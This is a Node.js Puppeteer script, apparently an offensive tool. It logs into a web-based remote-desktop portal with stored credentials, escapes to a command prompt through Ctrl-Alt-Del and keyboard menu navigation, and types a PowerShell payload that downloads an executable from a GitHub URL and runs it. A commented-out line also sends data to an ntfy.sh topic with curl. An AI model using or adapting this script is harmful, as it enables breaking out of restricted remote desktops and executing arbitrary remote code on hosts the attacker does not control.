const DEBUG = process.argv.includes("--debug");
const NOHL = process.argv.includes("no-headless");
const TIMER = process.argv.includes("--short") ? 15000 : 45000;
const CONVERT = !process.argv.includes("--no-convert")

import dotenv from "dotenv"
dotenv.config({ path: "./.env" });

import { readFileSync } from "fs";

import puppeteer from 'puppeteer';

const a2q = JSON.parse(readFileSync("./kb.json"))
const q2a = Object.fromEntries(Object.entries(a2q).map(a => a.reverse()))


// const PAYLOAD = 'curl -d "feur" ntfy.sh/aarys-main-test';
const PAYLOAD = ['powershell', 'Invoke-WebRequest -Uri "https.//github.com/aaryswastaken/blind/raw/main/ola_test3.exe.exe"', "ola.exe"]

const NUMBERS = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

// qwerty to azerty
function convert(text) {
    if (!CONVERT) {
	return text
    }

    return text.split("").map(c => {return Object.keys(a2q).includes(c) ? a2q[c]:c})
}

async function type(keyboard, text, to) {
    let keys = convert(text);

    for (let i=0;i<keys.length;i++) {
	if(NUMBERS.includes(keys[i])) {
	    await keyboard.down("Shift");
	    await new Promise(r => setTimeout(r, to))

	    await keyboard.press(keys[i]);
	    await new Promise(r => setTimeout(r, to))

	    await keyboard.up("Shift");
	    await new Promise(r => setTimeout(r, to))
	} else {
	    switch(keys[i]) {
		case ".":
		    await keyboard.down("Shift");
		    await new Promise(r => setTimeout(r, to))

		    await keyboard.press(",");
		    await new Promise(r => setTimeout(r, to))

		    await keyboard.up("Shift");
		    await new Promise(r => setTimeout(r, to))
		    break;
		case ":":
		    await keyboard.press(".");
		    await new Promise(r => setTimeout(r, to))
		default:
		    await keyboard.press(keys[i]);
		    await new Promise(r => setTimeout(r, to))
	    }
	}
    }
}

(async () => {
    const browser = await puppeteer.launch({headless: !NOHL});
    const page = await browser.newPage();

    await page.goto(process.env.URL);

    await new Promise(r => setTimeout(r, 500))

    const loginButtonSelector = '#loginButton';
    await page.waitForSelector(loginButtonSelector);

    await page.type('#username', process.env.UNAME);
    await page.type("#password", process.env.PASSWORD);
    await page.click(loginButtonSelector);

    const instanceSelector = ".ui-desktop-list";
    await page.waitForSelector(instanceSelector);

    await page.evaluate((sel) => {
        let i = Array.from(document.querySelector(sel).children).filter(child => child.id.includes("3d"))[0];

        Array.from(i.children)[0].click();
    }, instanceSelector);

    await page.waitForSelector(".desktopBackground");

    console.log("Starting timer")
    await new Promise(r => setTimeout(r, TIMER))

    try {
	await page.evaluate((btn) => {
		document.getElementById(btn).click()
	}, "cancelDialogBtn")
    } catch {}

    // Page is ready to implement the payload
    console.log("starting payload phase")

    const cadSelector = 'cad';

    await page.evaluate((sel) => {
        document.getElementById(sel).click();
        }, cadSelector);

    console.log("ctrl alt sup sent")

    await page.mouse.click(250, 250)

    await new Promise(r => setTimeout(r, 1000))
    await page.keyboard.press('Tab')

    await new Promise(r => setTimeout(r, 500))
    await page.keyboard.press('Tab')

    await new Promise(r => setTimeout(r, 500))
    await page.keyboard.press('Enter')

    await new Promise(r => setTimeout(r, 1000))
    await page.keyboard.press('Tab')

    await new Promise(r => setTimeout(r, 500))
    await page.keyboard.press('Space')

    await new Promise(r => setTimeout(r, 300))
    await page.keyboard.press('Alt')

    await new Promise(r => setTimeout(r, 300))
    await page.keyboard.press('f')

    await new Promise(r => setTimeout(r, 300))
    await page.keyboard.press('Enter')

    await new Promise(r => setTimeout(r, 1000))
    // await page.keyboard.type('cmd') // depends on the layout!
    await page.keyboard.press('c')
    await new Promise(r => setTimeout(r, 300))
    await page.keyboard.press(';') // m from qwerty to azerty
    await new Promise(r => setTimeout(r, 300))
    await page.keyboard.press('d')

    await new Promise(r => setTimeout(r, 500))
    await page.keyboard.press('Enter')

    await new Promise(r => setTimeout(r, 1000))


    for(const pl in PAYLOAD) {
        await type(page.keyboard, PAYLOAD[pl], 100)
	await new Promise(r => setTimeout(r, 500))
	
	await page.keyboard.press('Enter')
        await new Promise(r => setTimeout(r, 5000))
    }
})();
